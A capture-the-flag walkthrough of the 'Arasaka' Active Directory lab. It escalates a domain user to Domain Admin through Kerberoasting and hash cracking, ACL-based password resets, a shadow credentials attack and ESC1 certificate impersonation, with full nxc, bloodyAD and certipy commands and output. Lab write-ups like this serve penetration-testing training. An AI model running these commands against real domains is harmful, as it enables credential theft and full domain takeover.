# Arasaka 
## Easy - Active Directory machine
### Author
- [Henry Lever](https://www.linkedin.com/in/henry-lever-1a0b0822a)
# Scenario
### Starting Credentials
```
faraday:hacksmarter123
```
### Objective and Scope
You are a member of the Hack Smarter Red Team. This penetration test will operate under an assumed breach scenario, starting with valid credentials for a standard domain user, `faraday`.
The primary goal is to simulate a realistic attack, identifying and exploiting vulnerabilities to escalate privileges from a standard user to a Domain Administrator.
## Recon
- instance IP ==> `10.1.141.190`
### Nmap scan
- From the Nmap we can Notice that the target machine is a windows server and a Domain controller Running Active directory kerberos/DNS services Along with SMB/LDAP(s) and WinRM and ADCS
```bash
rustscan -a 10.1.141.190  -- -sS -sV -sC -A 
```
- Results
```
Discovered open port 135/tcp on 10.1.141.190
Discovered open port 53/tcp on 10.1.141.190
Discovered open port 3389/tcp on 10.1.141.190
Discovered open port 445/tcp on 10.1.141.190
Discovered open port 139/tcp on 10.1.141.190
Discovered open port 636/tcp on 10.1.141.190
Discovered open port 88/tcp on 10.1.141.190
Discovered open port 65218/tcp on 10.1.141.190
Discovered open port 65277/tcp on 10.1.141.190
Discovered open port 9389/tcp on 10.1.141.190
Discovered open port 3268/tcp on 10.1.141.190
Discovered open port 49667/tcp on 10.1.141.190
Discovered open port 389/tcp on 10.1.141.190
Discovered open port 3269/tcp on 10.1.141.190
Discovered open port 65231/tcp on 10.1.141.190
Discovered open port 49664/tcp on 10.1.141.190
Discovered open port 65256/tcp on 10.1.141.190
Discovered open port 49668/tcp on 10.1.141.190
Discovered open port 5985/tcp on 10.1.141.190
Discovered open port 464/tcp on 10.1.141.190
Discovered open port 65219/tcp on 10.1.141.190
Discovered open port 593/tcp on 10.1.141.190
Discovered open port 65245/tcp on 10.1.141.190

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-08-06 17:43:03Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Issuer: commonName=DC01.hacksmarter.local
|_ssl-date: 2026-08-06T17:44:47+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: HACKSMARTER
|   NetBIOS_Domain_Name: HACKSMARTER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hacksmarter.local
|   DNS_Computer_Name: DC01.hacksmarter.local
|   DNS_Tree_Name: hacksmarter.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-06T17:44:08+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
65218/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
65219/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
65231/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
65245/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
65256/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
65277/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   134.35 ms 10.200.0.1
2   ...
3   135.82 ms 10.1.141.190

```


### Lateral Movement to `alt.svc` via Kerberoasting 
- Using the Credentials we have we can Enumerate Kerberoastable users via `netexec` and luckily we found the user `hacksmarter.local\alt.svc` and we have successfully captured the RC4 encrypted hash (RC4 from the 23 in `krbtgs$23`)
```bash
nxc ldap $TARGET -u $USER -p $PASS --kerberoast kerberoas.txt                               

LDAP        10.1.141.190    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.local) (signing:None) (channel binding:Never)
LDAP        10.1.141.190    389    DC01             [+] hacksmarter.local\faraday:hacksmarter123
LDAP        10.1.141.190    389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.1.141.190    389    DC01             [*] Total of records returned 1
LDAP        10.1.141.190    389    DC01             [*] sAMAccountName: alt.svc, memberOf: [], pwdLastSet: 2025-09-21 18:07:42.894050, lastLogon: <never>
LDAP        10.1.141.190    389    DC01             $krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$hacksmarter.local\alt.svc*$027f332d04c4c7e0e53b4717adfe417d$2360016c18cafaab6d57b8823d498c
<SNIP>
02a42b8398866cb57a0e3c88e6ffa258b1908c883078e44d4a4b7f78
```
- Using hashcat to crack it we found the plaintext password for the `alt.svc` user!
```bash
 hashcat -m 13100 kerberoas.txt /usr/share/wordlists/rockyou.txt
```
- Now we have the credentials for the `alt.svc` user 
```bash
alt.svc:babygirl1

# leads to successfull login
nxc smb $TARGET -u alt.svc -p babygirl1 --shares                                            

SMB         10.1.141.190    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.1.141.190    445    DC01             [+] hacksmarter.local\alt.svc:babygirl1
```

### Bloodhound analysis
- we can collect the bloodhound data using any of the credentials we have, and for me I used `rusthound-ce` for the bloodhound data collection
```bash
rusthound-ce -d hacksmarter.local  -f dc01.hacksmarter.local -u $USER -p  $PASS  -c All --zip
```
- from this point we can Notice a clear path to Compromising the domain Admins by setting the `from` and `to` in the `pathfinder` tab ![[images/arasaka_bloodhound.png]]

So the attack chain from that path is as follows:
```
alt.svc --GenericAll--> Yorinobu --GenericWrite--> Soulkiller.svc --ESC1--> Administrator
```

## Compromising Domain admin
#### Abusing `GenericAll` to compromise `Yorinobu`
- Using `BloodyAD` We can change the target user password 
```bash
bloodyAD -d hacksmarter.local --host dc01.hacksmarter.local --dc-ip 10.1.141.190 -u alt.svc -p babygirl1 set password Yorinobu "Password123"

[+] Password changed successfully!

# Checking the changed password
nxc smb $TARGET -u Yorinobu -p "Password123"                                                                                           
SMB         10.1.141.190    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.1.141.190    445    DC01             [+] hacksmarter.local\Yorinobu:Password123
```
#### Abusing `GenericWrite` to compromise `Soulkiller.svc`
- Since we know that we have ADCS deployed on the Domain Controller so we can abuse this ACE to setup a shadow Credentials attack to Authenticate via PKI-INIT kerberos, and so we can do this attack simply using `certipy shadow auto` 
```bash
certipy shadow auto -u 'Yorinobu@hacksmarter.local' -p 'Password123' -account 'soulkiller.svc' -dc-ip 10.1.141.190


[*] Targeting user 'Soulkiller.svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2600005de79640aa89520f01845b3996'
[*] Adding Key Credential with device ID '2600005de79640aa89520f01845b3996' to the Key Credentials for 'Soulkiller.svc'
[*] Successfully added Key Credential with device ID '2600005de79640aa89520f01845b3996' to the Key Credentials for 'Soulkiller.svc'
[*] Authenticating as 'Soulkiller.svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'soulkiller.svc@hacksmarter.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'soulkiller.svc.ccache'
[*] Wrote credential cache to 'soulkiller.svc.ccache'
[*] Trying to retrieve NT hash for 'soulkiller.svc'
[*] Restoring the old Key Credentials for 'Soulkiller.svc'
[*] Successfully restored the old Key Credentials for 'Soulkiller.svc'
[*] NT hash for 'Soulkiller.svc': f4ab68f273<SNIP>5f973a
```
- As we can see the flow of the attack that is being automated using certipy, we end up having a valid TGT for the target user `soulkiller.svc` and even the `NT Hash` ! which certipy gets using [UnPAC the hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash#unpac-the-hash)

#### Abusing ADCS `ESC1` To compromise Domain administrator account
from the bloodhound image shown above we saw that there is ESC1 vulnerability in a Certificate template named `AI_Takeover`, and the `Soulkiller.svc` is the only principal of the Compromised account who has enrollment rights in this template, so we can simply re check this using `Certipy` OR `netexec`
```bash
nxc ldap $TARGET -u soulkiller.svc -H f4ab68f2730**********50d8fc5f973a -M certipy-find 

# Using Certipy
certipy find  -dc-ip 10.1.141.190 -u soulkiller.svc@hacksmarter.local -hashes f4ab68f27*********0d8fc5f973a -vulnerable -stdout 
```
- using any method of the Above we can confirm the ESC1 vulnerable template `AI_Takeover` and `Soulkiller.svc` enrollment rights
```txt
Certificate Templates
  0
    Template Name                       : AI_Takeover
    Display Name                        : AI_Takeover
    Certificate Authorities             : hacksmarter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    <SNIP>
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACKSMARTER.LOCAL\Soulkiller.svc
                                          HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : HACKSMARTER.LOCAL\Administrator
        Full Control Principals         : HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        Write Owner Principals          : HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        Write Dacl Principals           : HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
        Write Property Enroll           : HACKSMARTER.LOCAL\Domain Admins
                                          HACKSMARTER.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : HACKSMARTER.LOCAL\Soulkiller.svc
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
#### Exploiting ESC1 
- Using Certipy we can req a certificate Impersonating the `administrator` via the Vulnerable `AI_Takeover` template using the following commands
	1. Get the SID of the Administrator account
	```bash
	certipy account -dc-ip 10.1.141.190 -u soulkiller.svc@hacksmarter.local -hashes f4ab68f2********d8fc5f973a -user 'administrator' read
	
	[*] Reading attributes for 'Administrator':
		<SNIP>
	    objectSid                           : S-1-5-21-3154413470-3340737026-2748725799-500
		<SNIP>
	```
	1. Request a Certificate impersonating the administrator
	```bash
	certipy req -dc-ip 10.1.141.190 -u soulkiller.svc@hacksmarter.local -hashes f4ab68********8fc5f973a -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'administrator@hacksmarter.local' -sid 'S-1-5-21-3154413470-3340737026-2748725799-500'

	Certipy v5.0.4 - by Oliver Lyak (ly4k)
	
	[*] Requesting certificate via RPC
	[*] Request ID is 5
	[*] Successfully requested certificate
	[*] Got certificate with UPN 'administrator@hacksmarter.local'
	[*] Certificate object SID is 'S-1-5-21-3154413470-3340737026-2748725799-500'
	[*] Saving certificate and private key to 'administrator.pfx'
	[*] Wrote certificate and private key to 'administrator.pfx'
	```
	3. Using the Certificate we can try to Authenticate using is and via Kerberos PKINIT and get TGT, but when using this method in this scenario, we get this Kerberos Error ` KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)`, 
	```bash
	certipy auth -pfx administrator.pfx -dc-ip 10.1.141.190                                                                                        
	[*] Certificate identities:
	[*]     SAN UPN: 'administrator@hacksmarter.local'
	[*]     SAN URL SID: 'S-1-5-21-3154413470-3340737026-2748725799-500'
	[*]     Security Extension SID: 'S-1-5-21-3154413470-3340737026-2748725799-500'
	[*] Using principal: 'administrator@hacksmarter.local'
	[*] Trying to get TGT...
	[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)
	[-] Use -debug to print a stacktrace
	[-] See the wiki for more information
	```
	4. So this means that the Kerberos is refusing to Issue a TGT for the Administrator because the account requires a password change before it can authenticate, so the workaround here is to authenticate against LDAP and open an LDAP shell to change the administrator password through it, we can use `--ldap-shell` using Certipy and then via the `ldap shell` we type `change_password administrator Password12345`
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.1.141.190 -ldap-shell

# change_password administrator Password12345
Got User DN: CN=Administrator,CN=Users,DC=hacksmarter,DC=local
Attempting to set new password of: Password12345
Password changed successfully!
```

## Root flag
```bash
ﷺ    ~/hacksmarter/arasaka ❯ nxc winrm $TARGET -u Administrator -p "Password12345" -X 'type ~/desktop/root.txt'                                                       
WINRM       10.1.141.190    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.local)
WINRM       10.1.141.190    5985   DC01             [+] hacksmarter.local\Administrator:Password12345 (Pwn3d!)
WINRM       10.1.141.190    5985   DC01             [+] Executed command (shell type: powershell)
WINRM       10.1.141.190    5985   DC01             fcf1dd0f08d*********ecf05
```
